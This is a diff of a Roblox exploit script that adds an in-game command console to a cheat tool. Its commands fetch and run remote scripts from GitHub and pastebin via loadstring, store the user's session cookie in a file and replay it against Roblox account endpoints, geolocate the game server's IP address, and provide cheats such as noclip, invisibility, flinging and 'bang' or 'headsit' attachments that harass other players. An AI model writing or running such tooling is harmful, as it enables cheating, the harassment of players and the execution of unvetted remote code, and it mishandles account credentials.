@@ -70,6 +70,8 @@ local HTTP = game:GetService("HttpService")
 local NetworkClient = game:GetService("NetworkClient")
 local Players = game:GetService("Players")
 
+local ToggleKenzen
+
 -- [ Functions ] -- 
 
 local function RequestURL(URL,KeepActive)
@@ -163,9 +165,9 @@ end
 local function SaveSettings()
 	local SettingsString = "return {"
 	for i,v in pairs(Settings) do
-		SettingsString ..= "\n\t" .. tostring(i) .. " = " .. tostring(v)
+		SettingsString ..= "\n\t" .. tostring(i) .. " = " .. tostring(v) .. ","
 	end
-	SettingsString ..= SettingsString .. "\n}"
+	SettingsString ..= "\n}"
 	writefile("settings.lua",SettingsString)
 end
 
@@ -568,7 +570,7 @@ if Settings.ExtraGlobals then
 
 	task.defer(function() -- :: ServerInfo
 		local peer,replicator = NetworkClient.ConnectionAccepted:Wait()
-		local data = game:GetService("HttpService"):JSONDecode(RequestURL("http://ip-api.com/json/" .. peer:sub(1, peer:find("|")-1)))
+		local data = HTTP:JSONDecode(RequestURL("http://ip-api.com/json/" .. peer:sub(1, peer:find("|")-1)))
 		local ServerInfo = {
 			Country = data.country,
 			CountryCode = data.countrycode,
@@ -675,7 +677,6 @@ if Settings.FastLoad then
 				Inst.Changed:Connect(function(ChangedProp)
 					if Properties[Inst][ChangedProp] then
 						Inst[ChangedProp] = Properties[Inst][ChangedProp]
-						printconsole(Inst.Name .. " " .. ChangedProp)
 					end
 				end)
 			end
@@ -768,9 +769,1735 @@ if Settings.ToggleGUI then
 	end)
 end]]
 
+if Settings.ToggleGUI then
+	-- :: Variables
+	
+	local Background,ConsoleScroll,ConsoleExample,SettingsScroll,SettingsExample,CommandsFrame,CommandsScroll,CommandBar,Commands,Visible,Token
+	
+	local PathfindingService = game:GetService("PathfindingService")
+	local TweenService = game:GetService("TweenService")
+	local HTTP = game:GetService("HttpService")
+	local TextService = game:GetService("TextService")
+	
+	local Ping; task.defer(function()
+		Ping = GetToPath(game:GetService("Stats"),"Network.ServerStatsItem.Data Ping")
+	end)
+
+	local noclipping,Flying,Toggle,BackgroundToggle = false,false,true,false
+	local ChatRemote; task.defer(function()
+		ChatRemote = GetToPath(game:GetService("ReplicatedStorage"),"DefaultChatSystemChatEvents.SayMessageRequest")
+	end)
+	
+	local EventStorage = {}
+	
+	printconsole = function(...)
+		local NewString = ""
+		local Packed = table.pack(...)
+		for i,v in pairs(Packed) do
+			if tonumber(i) then
+				NewString ..= " " .. tostring(v)
+			end
+		end
+		
+		local NewPrint = ConsoleExample:Clone(); do
+			NewPrint.Text = NewString
+			NewPrint.Size = UDim2.new(0,383,0,TextService:GetTextSize(NewString,12,Enum.Font.Ubuntu,Vector2.new(383,math.huge)).Y)
+			NewPrint.Parent = ConsoleScroll
+		end
+	end; 
+	
+	local ShortName = function(Name,IncludeLocal)
+		local Users = {}; local Names = string.split(Name,",")
+		for _,v in pairs(Names) do
+			for _,plr in pairs(Players:GetPlayers()) do
+				if IncludeLocal and string.sub(string.lower(plr.Name),1,#v) == string.lower(v) or 
+					plr ~= Player and string.sub(string.lower(plr.Name),1,#v) == string.lower(v) or 
+					IncludeLocal and string.sub(string.lower(plr.DisplayName),1,#v) == string.lower(v) or 
+					plr ~= Player and string.sub(string.lower(plr.DisplayName),1,#v) == string.lower(v) then
+					table.insert(Users,plr)
+				end
+			end
+		end
+		return Users[1] and Users or nil
+	end
+	
+	local PredictPos = function(Pos1, Velocity1, Pos2, Velocity2, _Pos3, TOAOff, DISTOff)
+		local DIST = (Pos1 - (_Pos3 or Pos2)).Magnitude + (DISTOff or 0)
+		local TOA = (DIST / Velocity1.Magnitude) + (TOAOff or 0)
+		local POS = Pos2 + (Velocity2 * TOA)
+		return POS
+	end
+	
+	local ClearConnections = function(Folder)
+		if EventStorage[Folder] then
+			for i,v in pairs(EventStorage[Folder]) do
+				v:Disconnect()
+			end
+		end; EventStorage[Folder] = {}
+	end
+	
+	local GetPing = function(Divider) Divider = Divider or 1000
+		return Ping:GetValue()/Divider
+	end
+	
+	local AttachToPlayer = function(ToPlr,Offset,Prediction)
+		local function FixYAxis(Velocity)
+			return Vector3.new(Velocity.X,Velocity.Y/3.5,Velocity.Z)
+		end
+		ClearConnections("Attachments")
+
+		if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and not Player.Character.HumanoidRootPart:FindFirstChild("BodyVelocity") then
+			local BodyVelocity = Instance.new("BodyVelocity"); do
+				BodyVelocity.MaxForce = Vector3.new(1,1,1) * math.huge; 
+				BodyVelocity.P = math.huge; 
+				BodyVelocity.Velocity = Vector3.new()
+				BodyVelocity.Parent = Player.Character.HumanoidRootPart;
+			end
+
+			local BodyAngularVelocity = Instance.new("BodyAngularVelocity"); do
+				BodyAngularVelocity.MaxTorque = Vector3.new(1,1,1) * math.huge;
+				BodyAngularVelocity.P = math.huge; 
+				BodyAngularVelocity.AngularVelocity = Vector3.new(0,0,0)
+				BodyAngularVelocity.Parent = Player.Character.HumanoidRootPart
+			end
+		end
+
+		table.insert(EventStorage["Attachments"],Event:Connect(function()
+			if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and ToPlr and ToPlr.Parent and ToPlr.Character and ToPlr.Character:FindFirstChild("HumanoidRootPart") then
+				local Positioning = Prediction and CFrame.new(PredictPos(Player.Character.HumanoidRootPart.Position, 
+					Vector3.new(math.huge, 0, 0), 
+					ToPlr.Character.HumanoidRootPart.Position, 
+					FixYAxis(ToPlr.Character.HumanoidRootPart.Velocity), 
+					nil, 
+					.4+GetPing(1000))) * (ToPlr.Character.HumanoidRootPart.CFrame-ToPlr.Character.HumanoidRootPart.Position) * Offset or ToPlr.Character.HumanoidRootPart.CFrame * Offset
+				Player.Character.HumanoidRootPart.CFrame = Positioning
+			end
+		end))
+
+		Player.CharacterAdded:Connect(function()
+			ClearConnections("Attachments")
+		end)
+	end
+	
+	local Loadstring = function(Link,NoHTTP,ChunkName)
+		if loadstring then
+			return loadstring(NoHTTP and Link or RequestURL(Link,true),ChunkName)()
+		end
+	end
+	
+	local GetAuthentication = function()
+		local cookie = _OG.readfile("cookie.txt")
+		local authRes = request({
+			Url = "https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate",
+			Method = "POST",
+			Headers = {
+				["content-type"] = "application/json",
+				["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36",
+				["cookie"] = cookie,
+			}
+		});
+		if authRes.Success then
+			return authRes.Headers["x-csrf-token"];
+		end;
+		local authRes2 = request({
+			Url = "https://auth.roblox.com/v1/account/pin",
+			Method = "GET",
+			Headers = {
+				["content-type"] = "application/json",
+				["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36",
+				["cookie"] = cookie,
+				["X-CSRF-TOKEN"] = authRes.Headers["x-csrf-token"]
+			}
+		});
+		if authRes2.Success then
+			Token = authRes.Headers["x-csrf-token"]; task.delay(600,function() 
+				Token = nil	
+			end)
+			--return 
+		else
+			printconsole("Incorrect Cookie","Your cookie invalid")
+		end
+	end
+	
+	local PreventSleeping = function(Part) 
+		ClearConnections("SleepEvent")
+		local SleepEvent = Event:Connect(function()
+			Sethiddenproperty(Part, "NetworkIsSleeping", false)
+		end); table.insert(EventStorage["SleepEvent"],SleepEvent)
+
+		Part.AncestryChanged:Connect(function()
+			if not Part or not Part.Parent then
+				ClearConnections("SleepEvent")
+			end
+		end)
+
+		return SleepEvent
+	end
+	
+	local CheckForRCD = function() 
+		return not Gethiddenproperty and true or Gethiddenproperty(workspace,"RejectCharacterDeletions") == Enum.RejectCharacterDeletions.Enabled
+	end
+	
+	Commands = {
+		["print"] = {
+			Args = {"Text"},
+			Alias = {},
+			Function = function(Args)
+				local String = ""
+				for i,v in pairs(Args) do
+					String ..= " " .. v
+				end
+				print(String)
+			end,
+		},
+		["loadstring"] = {
+			Args = {"Script"},
+			Alias = {"s","execute"},
+			Function = function(Args)
+				local String = ""
+				for i,v in pairs(Args) do
+					String ..= " " .. v
+				end
+				Loadstring(String,true)
+			end,
+		},
+		["commands"] = {
+			Args = {},
+			Alias = {"cmds","help"},
+			Function = function()
+				CommandsFrame.Visible = true; CommandsFrame.Position = UDim2.new(0.1, 0, 0.3, 0)
+			end,
+		},
+
+		["respawn"] = {
+			Args = {},
+			Alias = {"gr"},
+			Function = function()
+				if Visible then
+					Visible(); Visible = nil
+				end
+				if game.PlaceId == 7115420363 then game:GetService("ReplicatedStorage").Respawn:FireServer()
+				elseif game.PlaceId == 7143319086 then Player.Respawn:FireServer()
+				elseif game.PlaceId == 9307193325 or game.PlaceId == 5100950559 then
+					Global.ToggleChatFix = false
+					local ChatBar = GetToPath(Player,"PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar")
+					local Text = ChatBar.Text
+					ChatBar:SetTextFromInput("-gr")
+					Players:Chat("-gr")
+					ChatBar:SetTextFromInput(Text)
+					Global.ToggleChatFix = true
+				elseif CheckForRCD() then
+					local CameraType = workspace.CurrentCamera.CameraType
+					workspace.CurrentCamera.CameraType = Enum.CameraType.Fixed
+
+					Player.Character:PivotTo(CFrame.new(0,workspace.FallenPartsDestroyHeight+0.1,0))
+					task.defer(function()
+						fwait(GetPing(850))
+						Player.Character:WaitForChild("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Dead, true)
+						Player.Character.Humanoid:TakeDamage(9e9 + 9e9 + 9e9 + 9e9); Player.Character.Humanoid.Health = 0
+						if firesignal then firesignal(Player.Character.Humanoid.Died) end
+					end)
+
+					Player.CharacterAdded:Wait()
+					workspace.CurrentCamera.CameraType = CameraType
+				elseif Player.Character:FindFirstChild(Player.Name) then
+					Player.Character.Head:Destroy()
+				else
+					local char = Player.Character
+					if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
+					char:ClearAllChildren()
+					local newChar = Instance.new("Model")
+					newChar.Parent = workspace
+					Player.Character = newChar
+					Player.Character = char
+					newChar:Destroy()
+				end
+			end,
+		},
+
+		["refresh"] = {
+			Args = {},
+			Alias = {"re","unbang"},
+			Function = function()
+				local PreviousPosition = Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.CFrame or
+					Player.Character:FindFirstChild("Head") and Player.Character.Head.CFrame or
+					Player.Character.PrimaryPart and Player.Character.PrimaryPart.CFrame or
+					Player.Character:FindFirstChildOfClass("BasePart") and Player.Character:FindFirstChildOfClass("BasePart").CFrame
+				Commands["respawn"].Function()
+				Player.CharacterAdded:Wait()
+				Player.Character:WaitForChild("HumanoidRootPart").CFrame = PreviousPosition
+			end,
+		},
+
+		["hydroxide"] = {
+			Args = {},
+			Alias = {"remotespy","rspy","spy"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/init.lua",false,'init.lua')
+				Loadstring("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ui/main.lua",false,'ui/main.lua')
+			end,
+		},
+		["fatesadmin"] = {
+			Args = {},
+			Alias = {"fate"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua")
+			end,
+		},
+		["cmdx"] = {
+			Args = {},
+			Alias = {"cmdxadmin"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source")
+			end,
+		},
+		["backdoorchecker"] = {
+			Args = {},
+			Alias = {"bdc","bchecker"},
+			Function = function()
+				Loadstring('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua')
+			end,
+		},
+		["animstealer"] = {
+			Args = {},
+			Alias = {"animgrabber"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/AnimationStealer.lua")
+			end,
+		},
+		["aimlock"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				Loadstring("https://pastebin.com/raw/Zz5yB0D1")
+			end,
+		},
+		["antitp"] = {
+			Args = {},
+			Alias = {"notp"},
+			Function = function()
+				local humroot = Player.Character:FindFirstChild("HumanoidRootPart"); if humroot then
+					local prevpos = humroot.CFrame
+					while humroot and humroot.Parent do
+						if (humroot.Position - prevpos.Position).Magnitude < -2 or (humroot.Position - prevpos.Position).Magnitude > 2 then
+							humroot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+							humroot.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+							humroot.CFrame = prevpos
+						end
+						prevpos = humroot.CFrame
+						fwait()
+					end
+				end
+			end,
+		},
+		["antitool"] = {
+			Args = {},
+			Alias = {"notk","antitk","antiattach"},
+			Function = function()
+				Player.Character.ChildAdded:Connect(function(Tool)
+					if Tool:IsA("Tool") and Tool:FindFirstChild("Handle") then
+						for i,v in pairs(Tool.Handle:GetJoints()) do
+							if v and v.Parent and v.Parent.Parent and v.Parent.Parent ~= Player.Character and Players:GetPlayerFromCharacter(v.Parent.Parent) then
+								Player.Character.DescendantAdded:Wait() -- waits for the grip
+								Tool.Parent = Player.Backpack
+							end
+						end
+					end
+				end)
+			end,
+		},
+		["antipredict"] = {
+			Args = {"yaxis"},
+			Alias = {"velocityspoof","cleanfling2"},
+			Function = function(Args)
+				local HumanoidRootPart = Player.Character.HumanoidRootPart
+				local Velocity = Vector3.new(-2^14,Args[1] and tonumber(Args[1]) or -2^14,-2^14)
+				PreventSleeping(HumanoidRootPart)
+				while HumanoidRootPart and HumanoidRootPart.Parent do
+					RunService.PostSimulation:Wait()
+					local RootVelocity = HumanoidRootPart.Velocity
+					HumanoidRootPart.Velocity = Velocity
+					RunService.PreRender:Wait()
+					HumanoidRootPart.Velocity = RootVelocity
+				end; 
+			end,
+		},
+
+		["antibang"] = {
+			Args = {},
+			Alias = {"antiheadsit"},
+			Function = function()
+				local Height = workspace.FallenPartsDestroyHeight - 50
+				workspace.FallenPartsDestroyHeight = Height - 100
+				local HumanoidRootPart = Player.Character.HumanoidRootPart
+				local Camera = workspace.CurrentCamera
+				PreventSleeping(HumanoidRootPart)
+				while HumanoidRootPart and HumanoidRootPart.Parent do
+					local If = false
+					for i,v in pairs(Players:GetPlayers()) do
+						if v ~= Player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and (v.Character.HumanoidRootPart.Position-HumanoidRootPart.Position).Magnitude <= 5 then
+							if v.Character:FindFirstChildOfClass("Humanoid").Sit == true then
+								If = true
+							else
+								for _,Track in pairs(v.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks()) do
+									if Track.Speed >= 2.9 then
+										If = true
+									end
+								end
+							end
+						end
+					end
+					if If then
+						local RootCFrame = HumanoidRootPart.CFrame
+						local Cam = Camera.CFrame
+						HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart.Position.X,Height,HumanoidRootPart.Position.Z)--CFrame
+						Camera.CFrame = Cam
+						RunService.PreRender:Wait()
+						HumanoidRootPart.CFrame = RootCFrame
+						Camera.CFrame = Cam
+						task.wait(Player:GetNetworkPing()*4)
+					else
+						fwait()
+					end
+				end; 
+			end,
+		},
+		["antifling"] = {
+			Args = {},
+			Alias = {"physicsantifling"},
+			Function = function()
+				--Loadstring("https://raw.githubusercontent.com/L8X/phys/main/antifling.lua")
+				local Character = Player.Character
+				local Terrain = workspace:FindFirstChildOfClass("Terrain") or workspace:FindFirstAncestorOfClass("Part",true) or workspace:GetChildren()[1]
+
+				local function CreateConstraint(Part1,Part2,Parent)
+					local Constraint = Instance.new("NoCollisionConstraint"); do
+						Constraint.Part0 = Part1
+						Constraint.Part1 = Part2
+						Constraint.Parent = Parent
+					end
+
+					Part1.AncestryChanged:Connect(function()
+						if not Part1:IsDescendantOf(workspace) and Constraint and Constraint.Parent then
+							Constraint:Destroy()
+						end
+					end)
+					Part2.AncestryChanged:Connect(function()
+						if not Part2:IsDescendantOf(workspace) and Constraint and Constraint.Parent then
+							Constraint:Destroy()
+						end
+					end)
+				end
+
+				local function NoCollision(OtherCharacter)
+					local NewFolder = Instance.new("Folder"); do
+						NewFolder.Name = OtherCharacter.Name
+					end
+					OtherCharacter.DescendantAdded:Connect(function(v)
+						if v:IsA("BasePart") then
+							for _,vv in pairs(Character:GetDescendants()) do
+								if vv:IsA("BasePart") then
+									CreateConstraint(v,vv,NewFolder)
+								end
+							end
+						end
+					end)
+					for i,v in pairs(OtherCharacter:GetDescendants()) do
+						if v:IsA("BasePart") then
+							for _,vv in pairs(Character:GetDescendants()) do
+								if vv:IsA("BasePart") then
+									CreateConstraint(v,vv,NewFolder)
+								end
+							end
+						end
+					end
+					NewFolder.Parent = Terrain
+				end
+
+				local function AddPlayer(OtherPlayer)
+					if OtherPlayer ~= Player then
+						OtherPlayer.CharacterAdded:Connect(NoCollision)
+						if OtherPlayer.Character then NoCollision(OtherPlayer.Character) end
+					end
+				end
+
+				Players.PlayerAdded:Connect(AddPlayer)
+				for i,v in pairs(Players:GetPlayers()) do AddPlayer(v) end
+			end,
+		},
+		["antifling2"] = {
+			Args = {},
+			Alias = {"nophysicsantifling"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/NonPhysicsServiceAntiFling.lua")
+			end,
+		},
+		["explorer"] = {
+			Args = {},
+			Alias = {"betterdex","newdex"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/wally-rblx/awesome-explorer/main/source.lua")
+			end,
+		},
+		["dex"] = {
+			Args = {},
+			Alias = {"exprodex"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/L8X/ExProDex-V2/main/src.lua")
+			end,
+		},
+		["dexv4"] = {
+			Args = {},
+			Alias = {"upgradeddex"},
+			Function = function()
+				Loadstring("https://pastebin.com/raw/fPP8bZ8Z")
+			end,
+		},
+		["iy"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+			end,
+		},
+		["owlhub"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua")
+			end,
+		},
+		["boomboxhub"] = {
+			Args = {},
+			Alias = {"boombox"},
+			Function = function()
+				Loadstring('https://riptxde.dev/u/hub/script.lua')
+			end,
+		},
+		["serverhop"] = {
+			Args = {"type"},
+			Alias = {"hopserver"},
+			Function = function(Args)
+				local ServerList = HTTP:JSONDecode(RequestURL("https://games.roblox.com/v1/games/".. game.PlaceId.. "/servers/Public?sortOrder=Asc&limit=100"))
+				local Type = "Random"
+
+				if table.find({"small","smallest","lowest","low","bottom","s"},string.lower(Args[1])) then
+					Type = "Smallest"
+				elseif table.find({"large","largestest","highest","high","top","l"},string.lower(Args[1])) then
+					Type = "Largest"
+				end printconsole("Attempting to serverhop","Type: " .. Type)
+
+				local PlayerCount,ServerJobId = Type == "Smallest" and 100 or 0,nil
+				for i,v in pairs(ServerList.data) do
+					if Type == "Smallest" and v.playing < v.maxPlayers-1 and v.id ~= game.JobId and v.playing < PlayerCount or Type == "Largest" and v.playing < v.maxPlayers-1 and v.id ~= game.JobId and v.playing > PlayerCount then
+						PlayerCount = v.playing
+						ServerJobId = v.id
+					elseif not ServerJobId and v.id ~= game.JobId and v.playing < v.maxPlayers-1 then
+						ServerJobId = v.id
+					end 
+				end
+				if ServerJobId then
+					TeleportService:TeleportToPlaceInstance(game.PlaceId, ServerJobId)
+				end
+			end,
+		},
+		["reanimate"] = {
+			Args = {},
+			Alias = {"netless"},
+			Function = function()
+				Loadstring("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/ZendeyReanimate.lua")
+			end,
+		},
+		["tooldances"] = {
+			Args = {},
+			Alias = {"toolemotes","emotes","emote"},
+			Function = function()
+				if CheckForRCD() then
+					return -- game is patched
+				end
+
+				Global.ToolDancesSettings = {
+					Preload = false,
+					PreloadWait = true,
+					Reanimate = true,
+					R15 = false,
+				}
+				Loadstring("https://raw.githubusercontent.com/AwsZFvR4Fh6/Ya/main/toolanimations.lua")
+			end,
+		},
+		["r15tooldances"] = {
+			Args = {},
+			Alias = {"r15toolemotes","r15emotes","r15emote"},
+			Function = function()
+				if CheckForRCD() then
+					return -- game is patched
+				end
+
+				Global.ToolDancesSettings = {
+					Preload = false,
+					PreloadWait = true,
+					Reanimate = true,
+					R15 = true,
+				}
+				Loadstring("https://raw.githubusercontent.com/AwsZFvR4Fh6/Ya/main/toolanimations.lua")
+			end,
+		},
+		["f3x"] = {
+			Args = {},
+			Alias = {"btools"},
+			Function = function()
+				Loadstring(game:GetObjects("rbxassetid://4698064966")[1].Source,true)
+			end,
+		},
+		["copypos"] = {
+			Args = {},
+			Alias = {"copylocation"},
+			Function = function()
+				local Root = Player.Character:FindFirstChild("HumanoidRootPart") or Player.Character.PrimaryPart or Player.Character:FindFirstChild("Head") or Player.Character:FindFirstChildOfClass("BasePart")
+				if Root then setclipboard(RoundNumber(Root.Position.X) .. ", " .. RoundNumber(Root.Position.Y) .. ", " .. RoundNumber(Root.Position.Z)) end
+				printconsole("Copied position","Copied your .Position to your clipboard.")
+			end,
+		},
+		["antikorblox"] = {
+			Args = {},
+			Alias = {"removekorblox"},
+			Function = function()
+				Player.CharacterAdded:Connect(function(Character)
+					if Player.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+						Player.Character:WaitForChild("Korblox Deathspeaker Right Leg"):Destroy()
+					else
+						printconsole("R6 Needed","You cannot remove korblox on R15")
+					end
+				end)
+				if Player.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+					Player.Character:WaitForChild("Korblox Deathspeaker Right Leg"):Destroy()
+				else
+					printconsole("R6 Needed","You cannot remove korblox on R15")
+				end
+			end,
+		},
+		["savecookie"] = {
+			Args = {"cookie"},
+			Alias = {"cookie"},
+			Function = function(Args)
+				local Connected = ""
+				for i,v in pairs(Args) do
+					Connected ..= " " .. v
+				end
+				_OG.writefile("cookie.txt",Connected)
+			end,
+		},
+		["checkcookie"] = {
+			Args = {},
+			Alias = {},
+			Function = function(Args)
+				if _OG.isfile("cookie.txt") then
+					if not Token then GetAuthentication() end
+					if not Token then
+						printconsole("Cookie Invalid","Please get a new cookie.")
+					else
+						printconsole("Cookie Valid","You may proceed to use cookie related commands.")
+					end
+				else
+					printconsole("No Cookie","You have not added your cookie, please use the savecookie command.")
+				end
+			end,
+		},
+		["r6"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if _OG.isfile("cookie.txt") then
+					if not Token then GetAuthentication() end
+					if Token then
+						local Response = request({
+							Url = "https://avatar.roblox.com/v1/avatar/set-player-avatar-type",
+							Method = "POST",
+							Headers = {
+								["cookie"] = _OG.readfile("cookie.txt"),
+								["Content-Type"] = "application/json",
+								["x-csrf-token"] = Token,
+								["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0"
+							},
+							Body = HTTP:JSONEncode({
+								playerAvatarType = 1
+							})
+						})
+						if not Response.Success then
+							--Notify("Attempted to change to r6","Response code" .. Response.StatusCode)
+							printconsole(Response.StatusMessage,"StatusCode: " .. Response.StatusCode .. " | " .. Token)
+						else
+							Commands["refresh"].Function()
+						end
+					else
+						printconsole("Invalid Token?",Token)
+					end
+				else
+					printconsole("No Cookie","You have not added your cookie, please use the savecookie command.")
+				end
+			end,
+		},
+		["r15"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if _OG.isfile("cookie.txt") then
+					if not Token then GetAuthentication() end
+					if Token then
+						local Response = request({
+							Url = "https://avatar.roblox.com/v1/avatar/set-player-avatar-type",
+							Method = "POST",
+							Headers = {
+								["cookie"] = _OG.readfile("cookie.txt"),
+								["Content-Type"] = "application/json",
+								["x-csrf-token"] = Token,
+								["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0"
+							},
+							Body = HTTP:JSONEncode({
+								playerAvatarType = 3
+							})
+						})
+						if not Response.Success then
+							--Notify("Attempted to change to r6","Response code" .. Response.StatusCode)
+							printconsole(Response.StatusMessage,"StatusCode: " .. Response.StatusCode .. " | " .. Token)
+						else
+							Commands["refresh"].Function()
+						end
+					else
+						printconsole("Invalid Token?",Token)
+					end
+				else
+					printconsole("No Cookie","You have not added your cookie, please use the savecookie command.")
+				end
+			end,
+		},
+		["headsit"] = {
+			Args = {"Player"},
+			Alias = {},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1]); if ToPlr then ToPlr = ToPlr[1] 
+					AttachToPlayer(ToPlr,CFrame.new(0,1.6,1.15))
+					Player.Character:WaitForChild("Humanoid").Sit = true
+					PreventSleeping(Player.Character.HumanoidRootPart)
+					table.insert(EventStorage["Attachments"],Player.Character.Humanoid.Seated:Connect(function(Seated)
+						if not Seated then
+							if Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart:FindFirstChild("BodyVelocity") then Player.Character.HumanoidRootPart.BodyVelocity:Destroy() end
+							if Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart:FindFirstChild("BodyAngularVelocity") then Player.Character.HumanoidRootPart.BodyAngularVelocity:Destroy() end
+							ClearConnections("Attachments")
+							ClearConnections("SleepEvent")
+						end
+					end)); 
+				end
+			end,
+		},
+		["headsitpredict"] = {
+			Args = {"Player"},
+			Alias = {},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1]); if ToPlr then ToPlr = ToPlr[1] 
+					AttachToPlayer(ToPlr,CFrame.new(0,1.6,1.15),true) 
+					Player.Character:WaitForChild("Humanoid").Sit = true
+					PreventSleeping(Player.Character.HumanoidRootPart)
+					table.insert(EventStorage["Attachments"],Player.Character.Humanoid.Seated:Connect(function(Seated)
+						if not Seated then
+							if Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart:FindFirstChild("BodyVelocity") then Player.Character.HumanoidRootPart.BodyVelocity:Destroy() end
+							if Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart:FindFirstChild("BodyAngularVelocity") then Player.Character.HumanoidRootPart.BodyAngularVelocity:Destroy() end
+							ClearConnections("Attachments")
+							ClearConnections("SleepEvent")
+						end
+					end)); 
+				end
+			end,
+		},
+		["bang"] = {
+			Args = {"Player"},
+			Alias = {},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1]); if ToPlr then ToPlr = ToPlr[1] 
+					AttachToPlayer(ToPlr,CFrame.new(0,0,1)) 
+					PreventSleeping(Player.Character.HumanoidRootPart)
+					local bangAnim = Instance.new("Animation") do
+						if Player.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+							bangAnim.AnimationId = "rbxassetid://5918726674"
+						else
+							bangAnim.AnimationId = "rbxassetid://148840371"
+						end
+
+						local Anim = Player.Character.Humanoid:LoadAnimation(bangAnim); do
+							Anim:Play(.1, 1, 1)
+							Anim:AdjustSpeed(5)
+						end
+					end; 
+				end
+			end,
+		},
+		["bangpredict"] = {
+			Args = {"Player"},
+			Alias = {},
+			Function = function(Args)
+				local ToPlr = ShortName(Args[1]); if ToPlr then ToPlr = ToPlr[1] 
+					AttachToPlayer(ToPlr,CFrame.new(0,0,1),true) 
+					PreventSleeping(Player.Character.HumanoidRootPart)
+					local bangAnim = Instance.new("Animation") do
+						if Player.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+							bangAnim.AnimationId = "rbxassetid://5918726674"
+						else
+							bangAnim.AnimationId = "rbxassetid://148840371"
+						end
+
+						local Anim = Player.Character.Humanoid:LoadAnimation(bangAnim); do
+							Anim:Play(.1, 1, 1)
+							Anim:AdjustSpeed(5)
+						end
+					end end
+			end,
+		},
+		["rejoin"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if #Players:GetPlayers() <= 1 then
+					game:GetService('TeleportService'):Teleport(game.PlaceId, Player)
+				else
+					game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
+				end
+			end,
+		},
+		["invisible"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if Visible then
+					Visible(); Visible = nil
+				end
+				if not Global.RealChar then
+					local Player = game:GetService("Players").LocalPlayer
+					local RealChar = Player.Character
+					RealChar.Archivable = true
+					local FakeChar = RealChar:Clone()
+
+					for i,v in pairs(FakeChar:GetDescendants()) do
+						if v:IsA("BasePart") then
+							v.Material = Enum.Material.ForceField
+						end
+					end
+
+					RealChar:MoveTo(Vector3.new(0,math.huge,0))
+					fwait()
+					RealChar.HumanoidRootPart.Anchored = true
+
+					FakeChar.Parent = workspace
+					Player.Character = FakeChar
+
+					workspace.CurrentCamera.CameraSubject = FakeChar.Humanoid
+					if FakeChar:FindFirstChild("Animate") then FakeChar.Animate.Disabled = true; FakeChar.Animate.Disabled = false end
+
+					Visible = function()
+						workspace.CurrentCamera.CameraSubject = RealChar.Humanoid
+
+						RealChar.HumanoidRootPart.Anchored = false
+						RealChar.HumanoidRootPart.CFrame = FakeChar.HumanoidRootPart.CFrame
+
+						Player.Character = RealChar
+						FakeChar:Destroy()
+					end
+				end
+			end,
+		},
+		["visible"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if Visible then
+					Visible(); Visible = nil
+				end
+			end,
+		},
+		["noclip"] = {
+			Args = {},
+			Alias = {},
+			Function = function()
+				if EventStorage.Noclip then 
+					EventStorage.Noclip:Disconnect() EventStorage.Noclip = nil
+				end
